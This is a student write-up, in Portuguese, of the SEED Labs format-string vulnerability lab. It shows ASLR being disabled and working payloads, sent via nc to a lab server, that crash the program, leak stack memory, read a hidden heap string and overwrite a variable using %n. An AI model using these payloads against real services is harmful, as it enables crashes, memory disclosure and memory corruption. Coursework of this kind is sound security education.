# Semana 7

## SEED Labs - Format-String Vulnerability Lab

### Task 1

Primeiramente como parte do setup deste Lab, tivemos de desligar a randomização de endereços para facilitar a descoberta e localização dos endereços do programa.

    $ sudo sysctl -w kernel.randomize_va_space=0

Para a primeira tarefa bastou inserir a seguinte string de input:

    $ echo '%s' | nc 10.9.0.5 9090

A vulnerabilidade de format string envolve a tentativa de aceder e imprimir uma string localizada no endereço imediatamente acima da posição atual na pilha de execução. Isso geralmente leva a um acesso a uma região de memória além dos limites virtuais do processo, representando um risco de segurança significativo.

Ao observarmos que no lado do servidor não retornou ```Returned properly``` podemos concluir que o servidor crashou.

### Task 2

#### Task 2.A

Nesta task, "AAAA" é escolhido como um valor conhecido e os "%08x" são usados para formatar e imprimir os 4 bytes (32 bits) de cada valor na pilha de execução, onde n é o número desejado de valores para imprimir. Isso pode ser utilizado para explorar e analisar o conteúdo da memória adjacente na execução do programa.

```note
echo "AAAA%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
```
E o output do servidor:

```note
AAAA112233440000100008049DB5080E5320080E61C0FFB18480FFB183A8080E62D4080E5000FFB1844808049F7EFFB18480000000000000006408049F47080E5320000004D7FFB18585FFB18480080E532009C8F72000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C35B4F00080E5000080E5000FFB18A6808049EFFFFB1848000000105000005DC080E5320000000000000000000000000FFB18B340000000000000000000000000000010541414141
```

O final 41414141 é uma representação do endereço da string "AAAA" fornecida como entrada. Vale ressaltar que os bytes estão organizados de forma invertida.

Entre a string "AAAA" e 41414141, existe um total de 504 caracteres. Cada endereço é composto por 8 caracteres (32 bits), resultando em 63 endereços na pilha entre a string de formatação e o buffer.

Assim, para exibir os primeiros 4 bytes da entrada inicial, é necessário criar uma string contendo exatamente 64 %x: os 63 primeiros para mostrar os endereços intermediários e o último para apresentar os 32 bits iniciais (4 bytes) da entrada.


#### Task 2.B

Na tarefa atribuída, a meta consistia em exibir o conteúdo de uma string de mensagem secreta localizada na Heap, mais precisamente no endereço 0x080b4008. Empregamos os mesmos princípios utilizados na tarefa anterior, visto que o programa em execução no servidor permaneceu inalterado. Para representar o endereço 0x080b4008 como uma string, aplicamos a codificação \x08\x0b\×40\×08. Ao inserir esse endereço no início da entrada, seguido por 63 %08x e um %s, a string de formatação leu a partir desse endereço e revelou o valor oculto. O código executado foi o seguinte:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

E o output foi o seguinte:

![image](assets/s7i1.png)

### Task 3

#### Task 3.A


Nesta tarefa, o objetivo foi modificar o valor da variável "target", que foi inicialmente definida como 0x11223344 e está localizada no endereço 0x080e5068. O comando %n foi utilizado nas strings de formatação para escrever na região de memória correspondente ao argumento passado como parâmetro, com o intuito de registrar o número de caracteres escritos até aquele momento. A abordagem segue uma lógica semelhante à tarefa 2.B, com a diferença de que, em vez de ler do endereço selecionado, agora estamos escrevendo nele. O código executado foi o seguinte:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}
```

E output foi o seguinte:

![image](assets/s7i2.png)

#### Task 3.B

Nesta instância, o objetivo consistia em modificar o valor da variável "target" para um valor específico: 0x5000, equivalente a 20480 em decimal. Ao entender o comportamento do formato %n, que insere o número de caracteres escritos até o momento, a entrada até %n deveria conter exatamente 20480 caracteres. Dado que a entrada é extensa, utilizamos a notação %.NX, com N = 20480 + 4 - 63*8 = 19980, para preencher os 19980 caracteres restantes com o valor 0. O código executado foi o seguinte:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}
```

E o output o seguinte:

![image](assets/s7i3.png)

![image](assets/s7i4.png)


## CTF - Format Strings